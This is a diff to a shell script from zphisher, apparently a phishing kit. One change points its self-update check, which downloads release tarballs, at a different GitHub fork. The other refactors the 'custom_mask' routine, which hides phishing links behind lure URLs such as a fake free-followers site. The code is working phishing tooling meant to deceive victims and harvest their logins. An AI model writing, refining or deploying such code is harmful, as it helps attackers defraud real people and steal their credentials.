@@ -164,9 +164,9 @@ kill_pid() {
 # Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
+	relase_url='https://api.github.com/repos/dracksters/zphisher/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
+	tarball_url="https://github.com/dracksters/zphisher/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
@@ -551,19 +551,19 @@ tunnel_menu() {
 
 ## Custom Mask URL
 custom_mask() {
-{ sleep .5; clear; banner_small; echo; }
-read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
-echo
-if [[ $(echo "$mask_op" | tr '[:upper:]' '[:lower:]') == "y" ]]; then
-echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
-read -e -p "${WHITE} ==> ${ORANGE}" -i https:// mask_url
-if [[ ${mask_url//:} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
-mask=$mask_url
-echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
-else
-echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid URL type.. Using the default one.."
-fi
-fi
+    { sleep .5; clear; banner_small; echo; }
+    read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+    echo
+    if [[ $(echo "$mask_op" | tr '[:upper:]' '[:lower:]') == "y" ]]; then
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
+        read -e -p "${WHITE} ==> ${ORANGE}" -i https:// mask_url
+        if [[ ${mask_url} =~ ^https?:// || ${mask_url::4} == "www." ]] && [[ ${mask_url#http://} =~ ^[^,~!@%:=#;^*"\'|?+<>({})\\/]+$ ]] && [[ ${mask_url#https://} =~ ^[^,~!@%:=#;^*"\'|?+<>({})\\/]+$ ]]; then
+            mask=$mask_url
+            echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+        else
+            echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid URL type.. Using the default one.."
+        fi
+    fi
 }
 
 ## URL Shortner
